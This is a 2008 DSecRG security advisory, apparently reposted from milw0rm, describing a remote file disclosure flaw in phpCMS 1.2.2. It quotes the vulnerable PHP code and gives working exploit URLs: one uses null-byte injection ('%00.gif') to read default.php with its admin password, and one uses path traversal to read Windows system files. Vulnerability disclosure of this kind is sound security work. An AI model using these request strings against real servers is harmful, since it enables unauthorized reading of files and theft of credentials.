<html><head><title>phpCMS 1.2.2 (parser.php file) Remote File Disclosure Vulnerability</title></head><pre>Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-005


Application:                    phpCMS
Versions Affected:              1.2.2
Vendor URL:                     http://www.phpcms.de
Bug:                            Remote File Disclosure, Get admin password
Exploits:                       YES
Reported:                       10.01.2008
Vendor response:                12.01.2008
Date of Public Advisory:        29.01.2008
Authors:                        Alexandr Polyakov, Stas Svistunovich
                                Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)



Description
***********

phpCMS system has remote File Disclosure vulnerability in page /parser/include/class.cache_phpcms.php


Details
*******

Attacer can read any files in web directory.

In file parser/parser.php include class.cache_phpcms.php

---------------------------------------

        // Load the i18n Handler
        if (isset ($_GET ['file']) &amp;&amp; isset($DEFAULTS-&gt;I18N) &amp;&amp; 'on' == $DEFAULTS-&gt;I18N) {
                include(PHPCMS_INCLUDEPATH.'/class.lib_i18n_phpcms.php');
                $I18N = &amp;new i18n;
        }
        $PHPCMS-&gt;check_secure_stealth();
        include(PHPCMS_INCLUDEPATH.'/class.cache_phpcms.php');
        exit;

---------------------------------------


In file class.cache_phpcms.php function GetFile() parse URL and return full file name or default value.
Function checks file extension but does't check for null byte injection.

To read file  attacker must append a valid extension with null byte to file like a  &quot;%00.gif&quot; or smth.

---------------------------------------

// filequery exists, but filename is empty? -&gt; set the defaultvalue for filename
if(!stristr($temp, $DEFAULTS-&gt;PAGE_EXTENSION) AND
        !stristr($temp, '.gif') AND
        !stristr($temp, '.png') AND
        !stristr($temp, '.jpg') AND
        !stristr($temp, '.js') AND
        !stristr($temp, '.css') AND
        !stristr($temp, '.htm') AND
        !stristr($temp, '.html'))

{       if(substr($temp, -1) != '/') {
                $temp = trim($temp).'/'.$DEFAULTS-&gt;PAGE_DEFAULTNAME;
                $temp.= $DEFAULTS-&gt;PAGE_EXTENSION;
        } else {
                $temp = trim($temp).$DEFAULTS-&gt;PAGE_DEFAULTNAME;
                $temp.= $DEFAULTS-&gt;PAGE_EXTENSION;
        }
}

---------------------------------------


In file class.cache_phpcms.php function CheckFile() take file name and if file exist read it and print file contents.

---------------------------------------
$PfadUndDatei = $this-&gt;GetFile();

$this-&gt;name = basename($PfadUndDatei);
$this-&gt;path = dirname($PfadUndDatei);
...

// there's no contentfile with this name -&gt; errorpage or errormessage
if(!file_exists($DEFAULTS-&gt;DOCUMENT_ROOT.$this-&gt;path.'/'.$this-&gt;name)) {
        $errorname = basename($DEFAULTS-&gt;ERROR_PAGE_404);
        $errorpath = dirname($DEFAULTS-&gt;ERROR_PAGE_404);
        ...
...

$fsize = filesize($DEFAULTS-&gt;DOCUMENT_ROOT.$this-&gt;path.'/'.$this-&gt;name);
$fd = fopen($DEFAULTS-&gt;DOCUMENT_ROOT.$this-&gt;path.'/'.$this-&gt;name, &quot;rb&quot;);
$contents = fread($fd, $fsize);
$contents = trim($contents);
$fsize = strlen($contents);
fclose($fd);
...

echo $contents;

---------------------------------------


Example:



http://[server]/[installdir]/parser/parser.php?file=/parser/include/default.php%00.gif

default.php includes admin password and other defaults:

---------------------------------------

class defaults {
        function defaults() {
                global $PHP, $PHPCMS;
                if(!defined(&quot;_DEFAULTS_&quot;)) {
                        define(&quot;_DEFAULTS_&quot;, TRUE);
                }

                $this-&gt;PASS = 'YourPasswordHere';
...

---------------------------------------


In windows we can read any local file:

http://[server]/[installdir]/parser/parser.php?file=\..\..\..\..\..\..\..\..\..\..\boot.ini%00.gif




http://www.phpcms.de/download/index.en.html






About
*****




Digital Security is leading IT security company in Russia, providing information security consulting, audit 
and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 
and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with 
vulnerability reports, advisories and whitepapers posted regularly on our website.


Contact:        research [at] dsec [dot] ru
                http://www.dsec.ru (in Russian)

# milw0rm.com [2008-01-29]</pre></html>